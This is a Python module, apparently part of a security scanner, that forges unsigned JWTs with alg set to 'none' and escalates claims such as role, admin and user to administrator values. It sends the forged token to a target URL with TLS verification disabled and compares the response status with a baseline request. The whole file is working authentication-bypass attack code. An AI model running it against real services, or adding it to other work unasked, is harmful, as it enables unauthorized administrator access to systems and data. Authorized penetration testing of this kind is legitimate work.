"""
Execution logic for JWT alg=none signature bypass differential testing.
"""
from __future__ import annotations

import base64
import copy
import json
from dataclasses import dataclass
from typing import Any, Dict, Optional, Tuple

import requests


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * ((4 - len(segment) % 4) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def decode_jwt_claims(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    """Splits token on '.', base64url-decodes the header and payload
    segments (adding '=' padding as needed per segment), json.loads
    each. Raises ValueError on anything malformed (not exactly 3
    segments, invalid base64, invalid JSON)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"expected 3 segments in JWT, found {len(parts)}")

    try:
        header_bytes = _b64url_decode(parts[0])
        header = json.loads(header_bytes.decode("utf-8"))
    except Exception as exc:
        raise ValueError(f"invalid JWT header: {exc}") from exc

    try:
        payload_bytes = _b64url_decode(parts[1])
        payload = json.loads(payload_bytes.decode("utf-8"))
    except Exception as exc:
        raise ValueError(f"invalid JWT payload: {exc}") from exc

    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("JWT header and payload must be JSON objects")

    return header, payload


def forge_none_alg_token(header: Dict[str, Any], payload: Dict[str, Any]) -> str:
    """Operates on COPIES of header/payload, never mutates the
    caller's dicts. header["alg"] = "none". Privilege-escalation
    heuristic, in this exact order:
      if "role" in payload: payload["role"] = "admin"
      if "admin" in payload: payload["admin"] = True
      if "user" in payload and "admin" not in str(payload["user"]):
          payload["user"] = "admin"
    Base64url-encodes each (no padding, rstrip('=')), returns
    f"{header_b64}.{payload_b64}." with a trailing dot."""
    h = copy.deepcopy(header)
    p = copy.deepcopy(payload)

    h["alg"] = "none"

    if "role" in p:
        p["role"] = "admin"
    if "admin" in p:
        p["admin"] = True
    if "user" in p and "admin" not in str(p.get("user", "")):
        p["user"] = "admin"

    h_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(p, separators=(",", ":")).encode("utf-8"))

    return f"{h_b64}.{p_b64}."


@dataclass
class DifferentialResult:
    baseline_status: Optional[int] = None
    forged_status: Optional[int] = None
    error: Optional[str] = None


def run_differential(target: str, forged_token: str, timeout: int = 10) -> DifferentialResult:
    """requests.get(target, timeout=timeout) for baseline (no auth
    header); requests.get(target, headers={"Authorization": f"Bearer {forged_token}"}, timeout=timeout)
    for the forged attempt. Any requests exception on either call ->
    DifferentialResult(error=str(exc))."""
    url = target.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"

    try:
        baseline_r = requests.get(url, timeout=timeout, verify=False)
        baseline_status = baseline_r.status_code
    except requests.RequestException as exc:
        return DifferentialResult(error=f"baseline request failed: {exc}")

    try:
        headers = {"Authorization": f"Bearer {forged_token}"}
        forged_r = requests.get(url, headers=headers, timeout=timeout, verify=False)
        forged_status = forged_r.status_code
    except requests.RequestException as exc:
        return DifferentialResult(baseline_status=baseline_status, error=f"forged request failed: {exc}")

    return DifferentialResult(baseline_status=baseline_status, forged_status=forged_status, error=None)
